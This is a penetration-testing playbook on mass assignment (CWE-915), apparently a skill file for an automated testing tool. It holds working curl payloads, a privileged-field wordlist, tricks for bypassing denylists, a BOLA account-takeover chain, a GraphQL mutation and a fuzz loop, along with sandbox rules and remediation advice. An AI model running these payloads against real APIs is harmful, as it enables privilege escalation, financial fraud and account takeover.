# Mass Assignment (CWE-915) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1548 (Abuse Elevation Control Mechanism)
**OWASP Mapping:** A04:2021 – Insecure Design, A01:2021 – Broken Access Control
**Severity:** High
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: mass-assignment-v1
category: api-security
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A04:2021-Insecure Design
  - A01:2021-Broken Access Control
tags:
  - mass-assignment
  - cwe-915
  - parameter-binding
  - authorization-bypass
  - privilege-escalation
  - T1190
environments:
  - api
  - web
  - graphql
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Identify Mass Assignment Entry Points

Endpoints that bind request fields directly to model/database objects:

| Method | Endpoint Example | Vector |
|---|---|---|
| PUT | `/api/users/123` | Update full object |
| PATCH | `/api/users/123` | Partial update |
| POST | `/api/users` `/api/register` | Create with extra fields |
| GET params | `/api/users?role=admin` | Query-based binding |
| GraphQL mutation | `updateUser(input:{...})` | Arbitrary input object |

### 1.2 Field Fuzzing (Extra JSON Fields)

Send a benign baseline, then inject privileged fields and check the response:

```bash
curl -s -X PATCH https://target.com/api/users/123 \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"nickname":"test","role":"admin"}'

curl -s -X PUT https://target.com/api/users/123 \
  -H "Content-Type: application/json" \
  -d '{"isAdmin":true,"verified":true,"balance":999999,"enabled":true}'
```

Success indicator: the field appears in the response or a follow-up GET shows the change.

### 1.3 Known Parameter Wordlist

```
role, isAdmin, admin, is_admin, user_role, userRole, roles, permissions, scope,
isVerified, verified, emailVerified, is_active, isActive, active, enabled,
balance, credit, creditBalance, accountBalance, points, discount, price, amount,
status, is_premium, premium, plan, membership, rank, level,
deleted, is_deleted, isBlocked, blocked, flag, flags, banned, is_banned,
termsAccepted, superuser, staff, is_staff, is_superuser, is_approved, approved,
is_paid, paid, paymentVerified, mfaEnabled, password, resetPassword
```

### 1.4 Framework Fingerprint -> Parameter Style

| Framework | Binding style | Typical protected params |
|---|---|---|
| Rails | `params[:user]`, `User.new(params[:user])` | `admin`, `role`, `state` |
| Laravel | `$user->fill($request->all())` | `is_admin` (unless `$fillable`) |
| Spring Boot | `@RequestBody User` auto-binding | `role`, `admin`, `id` |
| Django | `ModelForm(request.POST)` | `is_staff`, `is_superuser`, `groups` |
| Node/Express | `Object.assign(user, req.body)` | `role`, `isAdmin`, any |
| .NET | `[FromBody]` model binding | `IsAdmin`, `Role` |
| GraphQL | resolver input types | any declared input field |

---

## 2. Confirmation

### 2.1 Privilege Escalation Confirmation

```bash
curl -s https://target.com/api/users/123 -H "Authorization: Bearer <token>" | jq '.role, .isAdmin, .balance'
curl -s -X PATCH https://target.com/api/users/123 \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"role":"admin","isAdmin":true,"verified":true,"balance":100000}'
curl -s https://target.com/api/admin/users -H "Authorization: Bearer <token>"
```

If the admin endpoint now returns data, escalation is confirmed.

### 2.2 Self-Registration Mass Assignment

```bash
curl -s -X POST https://target.com/api/register \
  -H "Content-Type: application/json" \
  -d '{"email":"hacker@evil.com","password":"Password1!","role":"admin","isAdmin":true,"balance":99999999}'
```

Also test `status:"active"`, `verified:true`, `plan:"enterprise"`, `quota:-1`, `trialEndsInDays:-100`.

### 2.3 Nested Objects / Alternate Formats

```bash
curl -s -X PATCH https://target.com/api/users/123 -H "Content-Type: application/json" \
  -d '{"profile":{"role":"admin"},"org":{"plan":"enterprise"}}'
```

Try JSON:API style: `{"data":{"attributes":{"is_staff":true}}}`.

---

## 3. Exploitation

### 3.1 Bypass Protected-Attribute Denylists

```
"is_admin": true, "isAdmin": true, "IS_ADMIN": true, "admin": true
"is_admin ": true, "is\u0020admin": true, "is_admin\u0000": true
"role": ["admin"], "role": "[\"admin\"]", "role": 1
{"role":"user","role":"admin"}
```

### 3.2 Combined with BOLA

```bash
curl -s -X PATCH https://target.com/api/users/{victim_id} \
  -H "Authorization: Bearer <token>" -H "Content-Type: application/json" \
  -d '{"role":"admin","verified":true,"email":"attacker@evil.com"}'
```

Chains BOLA (object ID control) with mass assignment (field binding) to escalate a third party.

### 3.3 GraphQL Mutation Mass Assignment

```graphql
mutation {
  updateUser(input: {
    id: 2
    role: "admin"
    isAdmin: true
    isVerified: true
    balance: 999999
    password: "pwned"
  }) { id role isAdmin }
}
```

Enumerate bindable fields via introspection: `query { __type(name: "UpdateUserInput") { inputFields { name } } }`.

### 3.4 Dangerous Fields Worth Testing

| Field | Impact |
|---|---|
| `role` / `isAdmin` | Privilege escalation |
| `verified` / `emailVerified` | Verification bypass |
| `balance` / `credits` | Financial fraud |
| `quota` / `plan` / `membership` | Licensing bypass |
| `isActive` / `banned` | Account state abuse |
| `orgId` / `teamId` | Tenant crossing |
| `password` / `resetToken` | Account takeover |
| `deleted` / `isDeleted` / `mfaEnabled` / `id` / `createdBy` | Persistence, MFA removal, ownership spoofing |

---

## 4. Tool-Specific Guidance

### 4.1 Burp Intruder (field name wordlist)

1. Intercept PATCH/PUT/POST with JSON body
2. Mark the field position: `{"FUZZ":true}`
3. Load the Section 1.3 wordlist
4. Sniper with grep match on `"role"`, `"admin"`, `"success"`
5. Compare response size/status for anomalies

Pull field names from PayloadsAllTheThings:
```bash
curl -s https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/Mass%20Assignment/README.md | rg -o '"(role|isAdmin|verified|balance|is_active)[^"]*"' | sort -u > mass_fields.txt
```

### 4.2 Arjun / nuclei

```bash
arjun -u https://target.com/api/users/123 -m JSON -T 10
nuclei -u https://target.com/api -t ~/nuclei-templates/http/misconfiguration/mass-assignment.yaml -jsonl ma.jsonl
```

### 4.3 ZAP / Caido

Active Scan with JSON parameter fuzzing; look for 200 + changed object.

---
## 5. PoC Generation

### PoC Template

```markdown
## Mass Assignment — [FINDING_ID]

**Endpoint:** https://target.com/api/users/123
**Method:** PATCH
**Object bound:** User model
**Injected field:** role / isAdmin / verified / balance

### Payload
`{"nickname":"x","role":"admin","isAdmin":true,"balance":999999,"verified":true}`

### Evidence
- Response reflects "role":"admin"
- GET /api/users/123 now returns role=admin
- /api/admin/users accessible with this account

### Impact
- Vertical privilege escalation to admin
- Financial manipulation (balance/credits)
- Verification bypass

### Remediation
- Use allow-list ($fillable / permitted params)
- Define explicit DTOs/input objects for binding
- Never bind reserved attributes (role, id, isAdmin)
- Validate and sanitize before persistence
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Each injected field tested against sandbox instance
- [ ] No real accounts modified to admin
- [ ] No production financial fields touched
- [ ] Framework binding behaviour documented
- [ ] Post-test data reset confirmed

### Prohibited Actions
- Escalating real production accounts
- Modifying balances or statuses on live systems
- Persisting unauthorized changes

---

## 7. Cheat Sheet / Reference

Framework binding style: see Section 1.4 (Rails `params[:user]`, Laravel `$request->all()`, Spring `@RequestBody`, Django ModelForm, Express `Object.assign`).

**Field fuzz one-liner:**
```bash
for f in role isAdmin is_admin verified balance enabled plan status active admin; do
  printf '{"nickname":"x","%s":true}\n' "$f" | curl -s -X PATCH \
    https://target.com/api/users/123 -H "Authorization: Bearer <t>" \
    -H "Content-Type: application/json" -d @- | rg -i "admin|role|true" && echo "HIT: $f"
done
```

**Bypass value sets:** `true, 1, "1", ["admin"], {"role":"admin"}, duplicate keys, whitespace, unicode, null-char`.

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1548 | Abuse Elevation Control Mechanism | Role/isAdmin escalation |
| T1136 | Create Account | During registration |
| T1564 | Hide Artifacts | deleted/isDeleted flags |
| T1078 | Valid Accounts | Post-escalation persistence |

---

## 9. References

- PayloadsAllTheThings Mass Assignment: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Mass%20Assignment
- HackTricks Mass Assignment (CWE-915): https://book.hacktricks.xyz/pentesting-web/mass-assignment-cwe-915
- CWE-915: https://cwe.mitre.org/data/definitions/915.html
- OWASP API Security A04: https://owasp.org/API-Security/editions/2023/en/0xa4-object-property-level-authorization/

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*
